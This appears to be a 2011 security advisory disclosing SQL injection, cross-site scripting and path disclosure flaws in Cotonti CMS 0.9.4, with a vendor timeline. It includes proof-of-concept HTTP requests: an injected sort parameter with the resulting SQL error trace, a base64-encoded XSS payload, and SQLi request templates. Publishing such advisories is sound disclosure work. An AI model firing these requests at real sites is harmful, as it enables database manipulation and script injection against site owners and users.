@@ -1,0 +1,99 @@
+Cotonti CMS v0.9.4 Multiple Remote Vulnerabilities
+
+
+Vendor: Cotonti Team
+Product web page: http://www.cotonti.com
+Affected version: 0.9.4 (Siena)
+
+Summary: Cotonti is a powerful open-source web development
+framework and content manager with a focus on security,
+speed and flexibility.
+
+Desc: Input passed via the parameters 'redirect.php' in
+'message.php' and 'w' and 'd' in 'index.php' script are
+not properly sanitised before being returned to the user
+or used in SQL queries. This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code or execute
+arbitrary HTML and script code in a user's browser session
+in context of an affected site. Path disclosure resides in
+the 'sq' parameter in '/plugins/search/search.php' script.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerabilities discovered by LiquidWorm and badc0re
+@zeroscience
+
+
+Vendor status:
+
+[18.09.2011] Path disclosure discovered.
+[18.09.2011] Contact with the vendor with sent details.
+[18.09.2011] Vendor responds promising patch in 0.9.5 release.
+[27.09.2011] SQL Injection and XSS discovered.
+[28.09.2011] Contact with the vendor with sent details.
+[09.10.2011] No response from vendor.
+[10.10.2011] Public security advisory released.
+
+
+
+Advisory ID: ZSL-2011-5051
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5051.php
+
+
+---
+
+PoC #1 [pd]:
+
+========================
+
+Request:
+
+- GET http://localhost/cotonti/index.php?e=search&sq=%5C'%5C'%5C'%5C'%5C'&rs%5Bsetlimit%5D=0&rs%5Bday%5D=18&rs%5Bmonth%5D=9&rs%5Byear%5D=2010&rs%5Bday%5D=18&rs%5Bmonth%5D=9&rs%5Byear%5D=2011&rs%5Bsetuser%5D=&rs%5Bpagsub%5D%5B%5D=all&rs%5Bpagtitle%5D=1&rs%5Bpagdesc%5D=1&rs%5Bpagtext%5D=1&rs%5Bpagsort%5D=date&rs%5Bpagsort2%5D=ASC&rs%5Bfrmsub%5D%5B%5D=all&rs%5Bfrmtitle%5D=1&rs%5Bfrmtext%5D=1&rs%5Bfrmsort%5D=updated'INJECTED_PARAM'INJECTED_PARAM&rs%5Bfrmsort2%5D=ASC HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://localhost/cotonti/index.php?e=search&sq=%27%27%27%27%27&rs[setlimit]=0&rs[day]=18&rs[month]=9&rs[year]=2010%271%27&rs[day]=18&rs[month]=9&rs[year]=2011&rs[setuser]=&rs[pagsub][]=all&rs[pagtitle]=1&rs[pagdesc]=1&rs[pagtext]=1&rs[pagsort]=date&rs[pagsort2]=ASC&rs[frmsub][]=all&rs[frmtitle]=1&rs[frmtext]=1&rs[frmsort]=updated&rs[frmsort2]=ASC
+Cookie: PHPSESSID=bnq658i0omp7t3u654i85llj51
+Content-length: 0
+
+Response:
+
+- Fatal error: SQL error 42S22: Column not found: 1054 Unknown column 'ft_updatedINJECTED_PARAMINJECTED_PARAM' in 'order clause'
+ 
+#0  cot_diefatal(SQL error 42S22: Column not found: 1054 Unknown column 'ft_updatedINJECTED_PARAMINJECTED_PARAM' in 'order clause') called at [D:\xampp2\htdocs\cotonti\system\database.php:436]
+#1  CotDB->query(SELECT SQL_CALC_FOUND_ROWS p.*, t.*
+                FROM cot_forum_posts AS p, cot_forum_topics AS t
+                WHERE t.ft_cat IN ('pub','general','offtopic') AND (t.ft_title LIKE '%\\\\\\\'\\\\\\\'\\\\\\\'\\\\\\\'\\\\\\\'%' OR p.fp_text LIKE '%\\\\\\\'\\\\\\\'\\\\\\\'\\\\\\\'\\\\\\\'%') AND p.fp_topicid = t.ft_id
+                GROUP BY t.ft_id ORDER BY ft_updatedINJECTED_PARAMINJECTED_PARAM ASC
+                LIMIT 0, 50) called at [D:\xampp2\htdocs\cotonti\plugins\search\search.php:367]
+#2  include(D:\xampp2\htdocs\cotonti\plugins\search\search.php) called at [D:\xampp2\htdocs\cotonti\system\plugin.php:94]
+#3  require_once(
+
+========================
+
+
+PoC #2 [xss]:
+
+========================
+
+
+- GET /cotonti-0.9.4/message.php?lng=page_confirm_unvalidate&m=page&msg=920&redirect=IiBvbm1vdXNlb3Zlcj1wcm9tcHQoOTk2NTQ5KSBiYWQ9Ig%3d%3d HTTP/1.1
+
+========================
+
+
+PoC #3 [sqli]:
+
+========================
+
+- GET http://localhost/cotonti-0.9.4/index.php?e=page&id=[SQLi]&m=edit HTTP/1.1
+
+- GET http://localhost/cotonti-0.9.4/index.php?e=users&f=all&s=regdate&w=[SQLi] HTTP/1.1
